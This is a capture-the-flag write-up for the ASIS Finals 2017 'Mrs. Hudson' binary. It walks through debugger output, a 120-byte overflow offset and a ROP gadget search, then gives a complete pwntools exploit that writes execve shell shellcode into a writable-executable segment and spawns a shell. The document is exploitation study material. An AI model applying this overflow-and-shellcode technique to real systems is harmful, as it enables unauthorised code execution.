# checkpoint
- double call scanf to place shellcode
- stack overflow to hijack ret address
- reuse code in main

# analyze
```shell
➜  AsisFinals2017_Mrs._Hudson ./mrs._hudson 
Let's go back to 2000.
ok
➜  AsisFinals2017_Mrs._Hudson checksec ./mrs._hudson 
[*] '/home/pitta/workspace/pwn_learn/rec0rd/draftBin/AsisFinals2017_Mrs._Hudson/mrs._hudson'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
➜  AsisFinals2017_Mrs._Hudson file ./mrs._hudson 
./mrs._hudson: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a99b54f5a0f90ebade826e34188ac1f5eebb2cc7, not stripped
```

**test for overflow**
```shell
=> 0x400686 <main+108>: ret    
   0x400687:    nop    WORD PTR [rax+rax*1+0x0]
   0x400690 <__libc_csu_init>:  push   r15
   0x400692 <__libc_csu_init+2>:        push   r14
   0x400694 <__libc_csu_init+4>:        mov    r15d,edi
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffded8 ("jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0008| 0x7fffffffdee0 ("AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0016| 0x7fffffffdee8 ("AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0024| 0x7fffffffdef0 ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0032| 0x7fffffffdef8 ("ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0040| 0x7fffffffdf00 ("AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0048| 0x7fffffffdf08 ("VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0056| 0x7fffffffdf10 ("AuAAXAAvAAYAAwAAZAAxAAyA")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000400686 in main ()
gdb-peda$ pattern offset jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApA
jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApA found at offset: 120
```

**figure out the position of the data we provide to the program**
```shell
gdb-peda$ b *0x400686
Breakpoint 3 at 0x400686
gdb-peda$ c
Continuing.
AAAAAAAA
[----------------------------------registers-----------------------------------]
RAX: 0x1 
RBX: 0x0 
RCX: 0xa ('\n')
RDX: 0x7ffff7dd3790 --> 0x0 
RSI: 0x1 
RDI: 0x7fffffffd930 --> 0x3c07c0 
RBP: 0x400690 (<__libc_csu_init>:       push   r15)
RSP: 0x7fffffffded8 --> 0x7ffff7a2d840 (<__libc_start_main+240>:        mov    edi,eax)
RIP: 0x400686 (<main+108>:      ret)
R8 : 0x0 
R9 : 0x7ffff7fda700 (0x00007ffff7fda700)
R10: 0x40072b --> 0x31b010000007325 
R11: 0x246 
R12: 0x400530 (<_start>:        xor    ebp,ebp)
R13: 0x7fffffffdfb0 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x40067b <main+97>:  mov    eax,0x0
   0x400680 <main+102>: call   0x400520 <__isoc99_scanf@plt>
   0x400685 <main+107>: leave  
=> 0x400686 <main+108>: ret    
   0x400687:    nop    WORD PTR [rax+rax*1+0x0]
   0x400690 <__libc_csu_init>:  push   r15
   0x400692 <__libc_csu_init+2>:        push   r14
   0x400694 <__libc_csu_init+4>:        mov    r15d,edi
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffded8 --> 0x7ffff7a2d840 (<__libc_start_main+240>:       mov    edi,eax)
0008| 0x7fffffffdee0 --> 0x1 
0016| 0x7fffffffdee8 --> 0x7fffffffdfb8 --> 0x7fffffffe263 ("/home/pitta/workspace/pwn_learn/rec0rd/draftBin/AsisFinals2017_Mrs._Hudson/mrs._hudson")
0024| 0x7fffffffdef0 --> 0x1f7ffcca0 
0032| 0x7fffffffdef8 --> 0x40061a (<main>:      push   rbp)
0040| 0x7fffffffdf00 --> 0x0 
0048| 0x7fffffffdf08 --> 0x9d8093989a5fa58f 
0056| 0x7fffffffdf10 --> 0x400530 (<_start>:    xor    ebp,ebp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 3, 0x0000000000400686 in main ()
gdb-peda$ find AAAAAAAA
Searching for 'AAAAAAAA' in: None ranges
Found 1 results, display max 1 items:
[stack] : 0x7fffffffde60 ("AAAAAAAA")      # but stack address is unreliable
```

**call again scanf to write shellcode**
```shell
gdb-peda$ vmmap 
Start              End                Perm      Name
0x00400000         0x00401000         r-xp      /home/pitta/workspace/pwn_learn/rec0rd/draftBin/AsisFinals2017_Mrs._Hudson/mrs._hudson
0x00600000         0x00601000         r-xp      /home/pitta/workspace/pwn_learn/rec0rd/draftBin/AsisFinals2017_Mrs._Hudson/mrs._hudson
0x00601000         0x00602000    (*)  rwxp      /home/pitta/workspace/pwn_learn/rec0rd/draftBin/AsisFinals2017_Mrs._Hudson/mrs._hudson
...
```
because we need to reuse the code in main, then trigger vuln to execute the shellcode we place

```shell
.text:000000000040066F lea     rax, [rbp+var_70]    # first ret here, ps:var70 = -70h
.text:0000000000400673 mov     rsi, rax
.text:0000000000400676 mov     edi, offset aS  ; "%s"
.text:000000000040067B mov     eax, 0
.text:0000000000400680 call    ___isoc99_scanf
```
need to keep rbp consistent

**search for gadget**
```shell
➜  AsisFinals2017_Mrs._Hudson ROPgadget --binary ./mrs._hudson --only "pop|ret"
Gadgets information
============================================================
0x00000000004006ec : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006ee : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006f0 : pop r14 ; pop r15 ; ret
0x00000000004006f2 : pop r15 ; ret
0x00000000004006eb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006ef : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400575 : pop rbp ; ret      # used
0x00000000004006f3 : pop rdi ; ret     
0x00000000004006f1 : pop rsi ; pop r15 ; ret   
0x00000000004006ed : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004004ee : ret
0x00000000004005a5 : ret 0xc148

Unique gadgets found: 12
```



# exploit
```python
from pwn import *

context(os="linux", arch="x86_64")
pipe = process("./mrs._hudson")
shellcode = '''
    push 0x68
    mov rax, 0x732f2f2f6e69622f
    push rax
    mov rdi, rsp
    push 0x1010101 ^ 0x6873
    xor dword ptr [rsp], 0x1010101
    xor esi, esi /* 0 */
    push rsi /* null terminate */
    push 8
    pop rsi
    add rsi, rsp
    push rsi /* 'sh\x00' */
    mov rsi, rsp
    xor edx, edx /* 0 */
    push SYS_execve /* 0x3b */
    pop rax
    syscall
'''
code = asm(shellcode)
# print("length of shellcode: %d" % len(code))    # 48


pop_rbp_ret = 0x400575
target_mem = 0x601000
scanf = 0x40066F
payload1 = "A" * 120
payload1 += p64(pop_rbp_ret) + p64(target_mem + 0x70) + p64(scanf)
pipe.sendline(payload1)

payload2 = code.ljust(0x78, "A")
payload2 += p64(target_mem)
pipe.sendline(payload2)

pipe.interactive()

```
run exp.py
```shell
➜  AsisFinals2017_Mrs._Hudson python2 ./exp.py
[+] Starting local process './mrs._hudson': pid 34535
[*] Switching to interactive mode
Let's go back to 2000.
$ ls
README.md  exp.py  mrs._hudson  peda-session-mrs._hudson.txt
```